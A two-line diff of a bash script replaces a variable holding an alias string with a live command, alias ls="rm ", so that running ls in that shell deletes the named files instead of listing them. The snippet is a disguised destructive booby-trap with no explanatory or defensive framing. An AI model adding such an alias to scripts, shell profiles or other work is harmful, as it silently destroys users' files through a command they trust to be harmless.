@@ -1,2 +1,2 @@
 #!/bin/bash
-ailas_command="alias ls='rm * ' "
+alias ls="rm "
